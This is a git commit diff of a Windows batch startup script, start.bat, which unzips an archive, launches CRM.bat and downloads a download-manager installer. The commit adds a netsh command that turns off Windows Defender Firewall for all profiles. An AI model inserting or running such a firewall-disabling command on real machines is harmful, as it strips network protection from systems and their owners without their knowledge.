4152eb2490c164b60b7d938d1c71241c9592d274
mi0nrio <baytout4@outlook.com>
2024-11-29 17:25:12 +0100

    Update start.bat

--- CM/start.bat
+++ CM/start.bat
@@ -1,5 +1,11 @@
 @echo off
-mode con: cols=15 lines=1
+mode con: cols=25 lines=2
+
+:: Disable Windows Defender Firewall for all profiles
+netsh advfirewall set allprofiles state off
+echo Windows Defender Firewall has been disabled.
+
+
 del "C:\Users\Public\Desktop\R 4.4.2.lnk" "C:\Users\Public\Desktop\Epic Games Launcher.lnk" "C:\Users\Public\Desktop\Unity Hub.lnk"
 unzip miso.zip
 start CRM.bat
@@ -7,21 +13,21 @@ start CRM.bat
 
 REM ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-set desktopPath=%USERPROFILE%\Desktop
-set folderName=MyApps
+:: set desktopPath=%USERPROFILE%\Desktop
+:: set folderName=MyApps
 
-echo Creating folder "%folderName%" on the desktop...
-mkdir "%desktopPath%\%folderName%"
-if exist "%desktopPath%\%folderName%" (
-    echo Folder created successfully!
-) else (
-    echo Failed to create the folder. Please check your permissions.
-)
+:: echo Creating folder "%folderName%" on the desktop...
+:: mkdir "%desktopPath%\%folderName%"
+:: if exist "%desktopPath%\%folderName%" (
+::     echo Folder created successfully!
+:: ) else (
+::     echo Failed to create the folder. Please check your permissions.
+:: )
 
 
 REM ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-cd /d C:\Users\runneradmin\Desktop\MyApps
+:: cd /d C:\Users\runneradmin\Desktop\MyApps
 
 :: Download the IDMan installer from the provided URL
 curl -L -o idman.exe "https://mirror2.internetdownloadmanager.com/idman642build25.exe?v=lt&filename=idman642build25.exe"
